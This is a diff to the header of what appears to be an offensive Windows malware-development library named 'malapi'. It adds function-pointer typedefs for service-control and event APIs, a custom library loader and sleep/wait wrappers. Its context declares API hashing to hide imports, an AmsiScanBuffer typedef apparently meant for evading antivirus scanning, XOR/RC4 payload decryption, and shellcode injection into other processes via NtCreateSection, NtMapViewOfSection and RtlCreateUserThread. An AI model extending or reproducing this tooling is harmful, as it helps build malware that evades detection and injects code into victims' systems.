@@ -1715,6 +1715,11 @@ typedef DWORD(WINAPI* typeWaitForSingleObject)(
 	_In_ DWORD  dwMilliseconds
 	);
 
+typedef DWORD(WINAPI* typeSleepEx)(
+	_In_ DWORD dwMilliseconds,
+	_In_ BOOL bAlertable
+	);
+
 typedef BOOL(WINAPI* typeCreateProcessA)(
 	_In_opt_	LPCSTR lpApplicationName,
 	_Inout_opt_ LPSTR lpCommandLine,
@@ -1906,6 +1911,51 @@ typedef HRESULT(WINAPI* typeAmsiScanBuffer)(
 	_Out_          AMSI_RESULT* result
 	);
 
+typedef HRESULT(WINAPI* typeSetServiceStatus)(
+	_In_ SERVICE_STATUS_HANDLE hServiceStatus,
+	_In_ LPSERVICE_STATUS      lpServiceStatus
+	);
+
+typedef BOOL(WINAPI* typeSetEvent)(
+	_In_ HANDLE hEvent
+	);
+
+typedef BOOL(WINAPI* typeResetEvent)(
+	_In_ HANDLE hEvent
+	);
+
+typedef SERVICE_STATUS_HANDLE(WINAPI* typeRegisterServiceCtrlHandlerA)(
+	_In_ LPCSTR lpServiceName,
+	_In_ LPHANDLER_FUNCTION lpHandlerProc
+	);
+
+typedef SERVICE_STATUS_HANDLE(WINAPI* typeRegisterServiceCtrlHandlerW)(
+	_In_ LPCWSTR lpServiceName,
+	_In_ LPHANDLER_FUNCTION lpHandlerProc
+	);
+
+typedef BOOL(WINAPI* typeStartServiceCtrlDispatcherA)(
+	_In_ CONST SERVICE_TABLE_ENTRYA* lpServiceStartTable
+	);
+
+typedef BOOL(WINAPI* typeStartServiceCtrlDispatcherW)(
+	_In_ CONST SERVICE_TABLE_ENTRYW* lpServiceStartTable
+	);
+
+typedef HANDLE(WINAPI* typeCreateEventA)(
+	_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
+	_In_     BOOL                  bManualReset,
+	_In_     BOOL                  bInitialState,
+	_In_opt_ LPCSTR                lpName
+	);
+
+typedef HANDLE(WINAPI* typeCreateEventW)(
+	_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
+	_In_     BOOL                  bManualReset,
+	_In_     BOOL                  bInitialState,
+	_In_opt_ LPCWSTR               lpName
+	);
+
 #pragma endregion
 
 #pragma region [macros]
@@ -1967,11 +2017,12 @@ namespace malapi
 	constexpr ULONG HashStringFowlerNollVoVariant1a(_In_ LPCSTR String)
 	{
 		ULONG Hash = 0x6A6CCC06;
+		ULONG Prime = 0x25EDE3FB;
 
 		while (*String)
 		{
 			Hash ^= (UCHAR)*String++;
-			Hash *= 0x25EDE3FB;
+			Hash *= Prime;
 		}
 
 		return Hash;
@@ -1979,11 +2030,12 @@ namespace malapi
 	constexpr ULONG HashStringFowlerNollVoVariant1a(_In_ LPCWSTR String)
 	{
 		ULONG Hash = 0x6A6CCC06;
+		ULONG Prime = 0x25EDE3FB;
 
 		while (*String)
 		{
 			Hash ^= (UCHAR)*String++;
-			Hash *= 0x25EDE3FB;
+			Hash *= Prime;
 		}
 
 		return Hash;
@@ -2020,8 +2072,6 @@ namespace malapi
 	//
 	VOID XOR(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
 
-	VOID AES(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
-
 	VOID RC4(_Inout_ BYTE* Input, _In_ SIZE_T InputLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen);
 
 	/////////////////////////////
@@ -2045,6 +2095,8 @@ namespace malapi
 	// GetProcAddress implementation with API hashing.
 	//
 	FARPROC GetProcAddressC(_In_ HMODULE dllBase, _In_ ULONG funcHash);
+
+	HMODULE LoadLibraryC(_In_ LPCSTR library_path);
 
 	//
 	// String compare implementation (ascii).
@@ -2107,6 +2159,7 @@ namespace malapi
 // Uses OpenProcess to get a handle to the process
 // Returns NULL on failure.
 //
+
 	HANDLE GetProcessHandle(DWORD process_id);
 
 	//
@@ -2131,6 +2184,15 @@ namespace malapi
 	//
 	HANDLE EntryPointHandle(LPSTR file_path, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size);
 
+	//////////////////////////////////
+   //                              //
+  //      Alternative Signal      //
+ //                              //
+//////////////////////////////////
+
+	VOID SleepEx(DWORD wait_time, BOOL alertable);
+	VOID WaitForSingleObject(HANDLE handle, DWORD wait_time);
+
 	/////////////////////////////////
    //                             //
   //      Process Injection      //
@@ -2138,7 +2200,7 @@ namespace malapi
 /////////////////////////////////
 
 //
-// Inject shellcode into a target process via NtCeationSection -> NtMapViewOfSection -> RtlCreateUserThread.
+// Inject shellcode into a target process via NtCreateSection -> NtMapViewOfSection -> RtlCreateUserThread.
 //
 	BOOL InjectionNtMapViewOfSection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size, _In_opt_ HANDLE additional_handle);
 
@@ -2307,12 +2369,24 @@ namespace malapi
   //      Service      //
  //                   //
 ///////////////////////
+#ifdef UNICODE
+#define CreateEvent CreateEventW
+#define RegisterServiceCtrlHandler RegisterServiceCtrlHandlerW
+#define StartServiceCtrlDispatcher StartServiceCtrlDispatcherW
+#else
+#define CreateEvent CreateEventA
+#define RegisterServiceCtrlHandler RegisterServiceCtrlHandlerA
+#define StartServiceCtrlDispatcher StartServiceCtrlDispatcherA
+#endif
 
-	//
-	// Sets the current service status and reports it to the SCM.
-	// Return None
-	//
-	VOID ReportSvcStatus(DWORD current_state, DWORD exit_code, DWORD wait_hint);
+	HANDLE CreateEventA(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCSTR lpName);
+	HANDLE CreateEventW(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCWSTR lpName);
+
+	SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA(_In_ LPCSTR lpServiceName, _In_ LPHANDLER_FUNCTION lpHandlerProc);
+	SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerW(_In_ LPCWSTR lpServiceName, _In_ LPHANDLER_FUNCTION lpHandlerProc);
+
+	BOOL StartServiceCtrlDispatcherA(_In_ CONST SERVICE_TABLE_ENTRYA* lpServiceStartTable);
+	BOOL StartServiceCtrlDispatcherW(_In_ CONST SERVICE_TABLE_ENTRYW* lpServiceStartTable);
 }
 
 #endif
